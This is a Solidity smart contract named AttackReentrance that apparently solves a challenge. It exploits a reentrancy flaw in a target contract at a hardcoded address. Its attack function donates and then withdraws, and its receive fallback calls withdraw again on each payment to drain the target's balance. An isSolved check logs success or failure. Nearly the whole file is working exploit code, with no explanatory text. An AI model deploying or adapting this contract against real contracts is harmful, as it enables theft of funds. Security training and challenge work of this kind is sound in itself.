// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITargetContract {
    function withdraw(uint256 ) external returns (bool success);
    function donate(address) external payable ;
    function unlock() external;
    function isSolved() external returns (bool);
}
contract AttackReentrance {
    ITargetContract reentrance;
    event Start(address indexed _target, uint256 _balance);
    event Stop(address indexed _target, uint256 _balance);
    event Reenter(address indexed _target, uint256 _balance);
    event Log(address sender, string message);
    constructor() {
        address _targetContractAddress = 0x9256714195290A53474949770862465A909951d6;
        reentrance = ITargetContract(_targetContractAddress);
    }
    function unlock() public {
        reentrance.unlock();
    }
    
    function attack() public payable {
        reentrance.donate{value: (0.001 ether)}(address(this));
        emit Start(address(reentrance), address(this).balance);
        reentrance.withdraw(0.001 ether);
    }
    receive() external payable {
    //fallback() external payable {
        reentrance.withdraw(0.001 ether);
        emit Reenter(address(reentrance), address(this).balance);
    }
    
    function isSolved() public {
        if (reentrance.isSolved()) {
            emit Log(msg.sender, "[+] Success." );
        } else {
            emit Log(msg.sender, "[-] Failure.");
        }       
    }
}